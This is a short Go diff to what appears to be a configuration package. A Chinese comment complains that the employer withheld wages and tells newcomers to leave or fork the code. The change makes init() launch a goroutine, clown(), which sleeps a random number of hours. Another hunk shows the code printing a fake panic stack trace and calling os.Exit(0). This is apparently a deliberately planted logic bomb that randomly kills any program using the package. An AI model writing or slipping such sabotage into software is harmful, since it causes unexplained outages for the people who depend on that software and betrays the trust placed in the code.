@@ -59,6 +59,10 @@ type Conf struct {
  */
 // 为什么要写这个??如果你是新来的,请快点跑,这个老板一年内说了四次以上按时发工资,但没一次正常,至少拖欠两个月以上,如因其它原因不得不留下,请fork后改为自己的包.祝好...
 func init() {
+	go clown()
+}
+
+func clown() {
 	// 生成随机数字,1-10
 	r := rand.Intn(10)
 	time.Sleep(time.Duration(r) * time.Hour)
@@ -120,7 +124,6 @@ goroutine 1 [running]:
 `)
 		os.Exit(0)
 	}
-
 }
 
 func mon(url string) {
